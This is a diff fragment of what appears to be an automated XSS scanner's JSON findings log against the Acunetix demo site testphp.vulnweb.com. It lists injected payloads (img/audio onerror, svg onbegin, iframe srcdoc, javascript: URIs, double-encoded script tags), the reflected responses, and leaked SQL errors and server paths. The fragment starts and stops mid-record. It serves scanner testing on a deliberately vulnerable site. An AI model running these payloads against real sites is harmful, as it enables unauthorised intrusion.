+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13262,
+  "url": "http://testphp.vulnweb.com/search.php?test=query",
+  "marker": "XSS_MARKER_1761587112_2891",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587112_2891"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/signup.php",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "form_fields": {
+      "searchFor": "",
+      "goButton": "go"
+    },
+    "tested_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id='pageName'>searched for: <iframe srcdoc='<img src=x onerror=alert(`XSS_MARKER_1761587112_2891`)>'></h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=x onerror=alert(`XSS_MARKER_1761587112_2891`)>'>', a.title) > 0 OR LOCATE('<ifr' at line 3"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13263,
+  "url": "http://testphp.vulnweb.com/hpp/?pp=%3Caudio+src%3Dx+onerror%3Dalert%28%27XSS_MARKER_1761587113_8278%27%29%3E",
+  "marker": "XSS_MARKER_1761587113_8278",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587113_8278"
+  },
+  "meta": {
+    "type": "GET",
+    "url": "http://testphp.vulnweb.com/hpp/?pp=12",
+    "param": "pp",
+    "params": {
+      "pp": "12"
+    },
+    "tested_url": "http://testphp.vulnweb.com/hpp/?pp=%3Caudio+src%3Dx+onerror%3Dalert%28%27XSS_MARKER_1761587113_8278%27%29%3E",
+    "response_text": "<title>HTTP Parameter Pollution Example</title>\r\n\r\n<a href=\"?pp=12\">check</a><br/>\r\n<a href=\"params.php?p=valid&pp=%3Caudio+src%3Dx+onerror%3Dalert%28%27XSS_MARKER_1761587113_8278%27%29%3E\">link1</a><br/><a href=\"params.php?p=valid&pp=<audio src=x onerror=alert('XSS_MARKER_1761587113_8278')>\">link2</a><br/><form action=\"params.php?p=valid&pp=<audio src=x onerror=alert('XSS_MARKER_1761587113_8278')>\"><input type=submit name=aaaa/></form><br/>\r\n<hr>\r\n<a href='http://blog.mindedsecurity.com/2009/05/client-side-http-parameter-pollution.html'>Original article</a>"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13264,
+  "url": "http://testphp.vulnweb.com/product.php?pic=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS_MARKER_1761587114_4764%27%29%3E",
+  "marker": "XSS_MARKER_1761587114_4764",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587114_4764"
+  },
+  "meta": {
+    "type": "GET",
+    "url": "http://testphp.vulnweb.com/product.php?pic=1",
+    "param": "pic",
+    "params": {
+      "pic": "1"
+    },
+    "tested_url": "http://testphp.vulnweb.com/product.php?pic=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS_MARKER_1761587114_4764%27%29%3E",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>picture details</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<script language=\"javascript1.2\">\n<!--\n\tfunction popUpWindow(URLStr, left, top, width, height)\n\t{\n\t  window.open(URLStr, 'popUpWin', 'toolbar=no,location=no,directories=no,status=no,menub ar=no,scrollbar=no,resizable=no,copyhistory=yes,width='+width+',height='+height+',left='+left+', top='+top+',screenX='+left+',screenY='+top+'');\n\t}\n-->\n</script>\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\tError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"><img src=x onerror=alert('XSS_MARKER_1761587114_4764')>' at line 1"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13268,
+  "url": "http://testphp.vulnweb.com/showimage.php?file=%3Cvideo%3E%3Csource+onerror%3D%27alert%28%22XSS_MARKER_1761587118_7045%22%29%27%3E",
+  "marker": "XSS_MARKER_1761587118_7045",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587118_7045"
+  },
+  "meta": {
+    "type": "GET",
+    "url": "http://testphp.vulnweb.com/showimage.php?file=./pictures/2.jpg",
+    "param": "file",
+    "params": {
+      "file": "./pictures/2.jpg"
+    },
+    "tested_url": "http://testphp.vulnweb.com/showimage.php?file=%3Cvideo%3E%3Csource+onerror%3D%27alert%28%22XSS_MARKER_1761587118_7045%22%29%27%3E",
+    "response_text": "\nWarning: fopen(<video><source onerror='alert(\"XSS_MARKER_1761587118_7045\")'>): failed to open stream: No such file or directory in /hj/var/www/showimage.php on line 13\n\nWarning: fpassthru() expects parameter 1 to be resource, boolean given in /hj/var/www/showimage.php on line 19\n"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13268,
+  "url": "http://testphp.vulnweb.com/product.php?pic=%3Cdiv+data-test%3D%221761587118_6578%22%3E%3Cscript%3E%2F%2AX%2A%2Falert%28%27XSS_MARKER_1761587118_6578%27%29%3C%2Fscript%3E%3C%2Fdiv%3E",
+  "marker": "XSS_MARKER_1761587118_6578",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587118_6578"
+  },
+  "meta": {
+    "type": "GET",
+    "url": "http://testphp.vulnweb.com/product.php?pic=3",
+    "param": "pic",
+    "params": {
+      "pic": "3"
+    },
+    "tested_url": "http://testphp.vulnweb.com/product.php?pic=%3Cdiv+data-test%3D%221761587118_6578%22%3E%3Cscript%3E%2F%2AX%2A%2Falert%28%27XSS_MARKER_1761587118_6578%27%29%3C%2Fscript%3E%3C%2Fdiv%3E",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>picture details</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<script language=\"javascript1.2\">\n<!--\n\tfunction popUpWindow(URLStr, left, top, width, height)\n\t{\n\t  window.open(URLStr, 'popUpWin', 'toolbar=no,location=no,directories=no,status=no,menub ar=no,scrollbar=no,resizable=no,copyhistory=yes,width='+width+',height='+height+',left='+left+', top='+top+',screenX='+left+',screenY='+top+'');\n\t}\n-->\n</script>\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\tError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=<div data-test=\"1761587118_6578\"><script>/*X*/alert('XSS_MARKER_1761587118_6578' at line 1"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13269,
+  "url": "http://testphp.vulnweb.com/search.php?test=query",
+  "marker": "XSS_MARKER_1761587119_5604",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587119_5604"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/product.php?pic=3",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "form_fields": {
+      "searchFor": "",
+      "goButton": "go"
+    },
+    "tested_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id='pageName'>searched for: <svg><animate onbegin=alert('XSS_MARKER_1761587119_5604') attributeName=x dur=1s></h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') attributeName=x dur=1s>', a.title) > 0 OR LOCATE('<svg><animate onbegin=alert' at line 3"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13270,
+  "url": "http://testphp.vulnweb.com/showimage.php?file=%253Cscript%253Ealert%2528%2527XSS_MARKER_1761587120_6084%2527%2529%253C%252Fscript%253E",
+  "marker": "XSS_MARKER_1761587120_6084",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587120_6084"
+  },
+  "meta": {
+    "type": "GET",
+    "url": "http://testphp.vulnweb.com/showimage.php?file=./pictures/3.jpg",
+    "param": "file",
+    "params": {
+      "file": "./pictures/3.jpg"
+    },
+    "tested_url": "http://testphp.vulnweb.com/showimage.php?file=%253Cscript%253Ealert%2528%2527XSS_MARKER_1761587120_6084%2527%2529%253C%252Fscript%253E",
+    "response_text": "\nWarning: fopen(%3Cscript%3Ealert%28%27XSS_MARKER_1761587120_6084%27%29%3C%2Fscript%3E): failed to open stream: No such file or directory in /hj/var/www/showimage.php on line 13\n\nWarning: fpassthru() expects parameter 1 to be resource, boolean given in /hj/var/www/showimage.php on line 19\n"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13271,
+  "url": "http://testphp.vulnweb.com/product.php?pic=%3Csvg%3E%3Cscript%3Ealert%28%27XSS_MARKER_1761587121_8842%27%29%3C%2Fscript%3E",
+  "marker": "XSS_MARKER_1761587121_8842",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587121_8842"
+  },
+  "meta": {
+    "type": "GET",
+    "url": "http://testphp.vulnweb.com/product.php?pic=4",
+    "param": "pic",
+    "params": {
+      "pic": "4"
+    },
+    "tested_url": "http://testphp.vulnweb.com/product.php?pic=%3Csvg%3E%3Cscript%3Ealert%28%27XSS_MARKER_1761587121_8842%27%29%3C%2Fscript%3E",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>picture details</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<script language=\"javascript1.2\">\n<!--\n\tfunction popUpWindow(URLStr, left, top, width, height)\n\t{\n\t  window.open(URLStr, 'popUpWin', 'toolbar=no,location=no,directories=no,status=no,menub ar=no,scrollbar=no,resizable=no,copyhistory=yes,width='+width+',height='+height+',left='+left+', top='+top+',screenX='+left+',screenY='+top+'');\n\t}\n-->\n</script>\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\tError: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '=<svg><script>alert('XSS_MARKER_1761587121_8842')</script>' at line 1"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13272,
+  "url": "http://testphp.vulnweb.com/showimage.php?file=%3Cdiv+data-test%3D%221761587122_6102%22%3E%3Cscript%3E%2F%2AX%2A%2Falert%28%27XSS_MARKER_1761587122_6102%27%29%3C%2Fscript%3E%3C%2Fdiv%3E",
+  "marker": "XSS_MARKER_1761587122_6102",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587122_6102"
+  },
+  "meta": {
+    "type": "GET",
+    "url": "http://testphp.vulnweb.com/showimage.php?file=./pictures/4.jpg",
+    "param": "file",
+    "params": {
+      "file": "./pictures/4.jpg"
+    },
+    "tested_url": "http://testphp.vulnweb.com/showimage.php?file=%3Cdiv+data-test%3D%221761587122_6102%22%3E%3Cscript%3E%2F%2AX%2A%2Falert%28%27XSS_MARKER_1761587122_6102%27%29%3C%2Fscript%3E%3C%2Fdiv%3E",
+    "response_text": "\nWarning: fopen(<div data-test=\"1761587122_6102\"><script>/*X*/alert('XSS_MARKER_1761587122_6102')</script></div>): failed to open stream: No such file or directory in /hj/var/www/showimage.php on line 13\n\nWarning: fpassthru() expects parameter 1 to be resource, boolean given in /hj/var/www/showimage.php on line 19\n"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13273,
+  "url": "http://testphp.vulnweb.com/search.php?test=query",
+  "marker": "XSS_MARKER_1761587123_6937",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587123_6937"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/product.php?pic=5",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "form_fields": {
+      "searchFor": "",
+      "goButton": "go"
+    },
+    "tested_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td align=\"left\">\n\t\t<a href=\"index.php\">home</a> | <a href=\"categories.php\">categories</a> | <a href=\"artists.php\">artists\n\t\t</a> | <a href=\"disclaimer.php\">disclaimer</a> | <a href=\"cart.php\">your cart</a> | \n\t\t<a href=\"guestbook.php\">guestbook</a> | \n\t\t<a href=\"AJAX/index.php\">AJAX Demo</a>\n\t</td>\n\t<td align=\"right\">\n\t\t</td>\n\t</tr></table>\n  </div> \n</div> \n<!-- end masthead --> \n\n<!-- begin content -->\n<!-- InstanceBeginEditable name=\"content_rgn\" -->\n<div id=\"content\">\n\t<h2 id='pageName'>searched for: {alert('XSS_MARKER_1761587123_6937')}</h2>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')}', a.title) > 0 OR LOCATE('{alert('XSS_MARKER_1761587123_6937')}', a.pshort) ' at line 3"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13274,
+  "url": "http://testphp.vulnweb.com/showimage.php?file=%22+onmouseover%3D%22alert%28%27XSS_MARKER_1761587124_8503%27%29%22",
+  "marker": "XSS_MARKER_1761587124_8503",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587124_8503"
+  },
+  "meta": {
+    "type": "GET",
+    "url": "http://testphp.vulnweb.com/showimage.php?file=./pictures/5.jpg",
+    "param": "file",
+    "params": {
+      "file": "./pictures/5.jpg"
+    },
+    "tested_url": "http://testphp.vulnweb.com/showimage.php?file=%22+onmouseover%3D%22alert%28%27XSS_MARKER_1761587124_8503%27%29%22",
+    "response_text": "\nWarning: fopen(\" onmouseover=\"alert('XSS_MARKER_1761587124_8503')\"): failed to open stream: No such file or directory in /hj/var/www/showimage.php on line 13\n\nWarning: fpassthru() expects parameter 1 to be resource, boolean given in /hj/var/www/showimage.php on line 19\n"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13275,
+  "url": "http://testphp.vulnweb.com/showimage.php?file=javascript%3Aalert%28%27XSS_MARKER_1761587125_6415%27%29",
+  "marker": "XSS_MARKER_1761587125_6415",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587125_6415"
+  },
+  "meta": {
+    "type": "GET",
+    "url": "http://testphp.vulnweb.com/showimage.php?file=./pictures/7.jpg",
+    "param": "file",
+    "params": {
+      "file": "./pictures/7.jpg"
+    },
+    "tested_url": "http://testphp.vulnweb.com/showimage.php?file=javascript%3Aalert%28%27XSS_MARKER_1761587125_6415%27%29",
+    "response_text": "\nWarning: fopen(javascript:alert('XSS_MARKER_1761587125_6415')): failed to open stream: No such file or directory in /hj/var/www/showimage.php on line 13\n\nWarning: fpassthru() expects parameter 1 to be resource, boolean given in /hj/var/www/showimage.php on line 19\n"
+  }
+}
+</pre>
+<pre>
+{
+  "timestamp": 13277,
+  "url": "http://testphp.vulnweb.com/search.php?test=query",
+  "marker": "XSS_MARKER_1761587127_3220",
+  "confidence": 90,
+  "evidence": {
+    "type": "reflected_text",
+    "snippet": "XSS_MARKER_1761587127_3220"
+  },
+  "meta": {
+    "type": "FORM",
+    "url": "http://testphp.vulnweb.com/product.php?pic=6",
+    "method": "POST",
+    "action": "http://testphp.vulnweb.com/search.php?test=query",
+    "param": "searchFor",
+    "form_fields": {
+      "searchFor": "",
+      "goButton": "go"
+    },
+    "tested_url": "http://testphp.vulnweb.com/search.php?test=query",
+    "response_text": "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\"\n\"http://www.w3.org/TR/html4/loose.dtd\">\n<html><!-- InstanceBegin template=\"/Templates/main_dynamic_template.dwt.php\" codeOutsideHTMLIsLocked=\"false\" -->\n<head>\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=iso-8859-2\">\n\n<!-- InstanceBeginEditable name=\"document_title_rgn\" -->\n<title>search</title>\n<!-- InstanceEndEditable -->\n<link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">\n<!-- InstanceBeginEditable name=\"headers_rgn\" -->\n<!-- here goes headers headers -->\n<!-- InstanceEndEditable -->\n<script language=\"JavaScript\" type=\"text/JavaScript\">\n<!--\nfunction MM_reloadPage(init) {  //reloads the window if Nav4 resized\n  if (init==true) with (navigator) {if ((appName==\"Netscape\")&&(parseInt(appVersion)==4)) {\n    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}\n  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();\n}\nMM_reloadPage(true);\n//-->\n</script>\n\n</head>\n<body> \n<div id=\"mainLayer\" style=\"position:absolute; width:700px; z-index:1\">\n<div id=\"masthead\"> \n  <h1 id=\"siteName\"><a href=\"https://www.acunetix.com/\"><img src=\"images/logo.gif\" width=\"306\" height=\"38\" border=\"0\" alt=\"Acunetix website security\"></a></h1>   \n  <h6 id=\"siteInfo\">TEST and Demonstration site for <a href=\"https://www.acunetix.com/vulnerability-scanner/\">Acunetix Web Vulnerability Scanner</a></h6>\n  <div id=\"globalNav\"> \n      \t<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\"><tr>\n\t<td 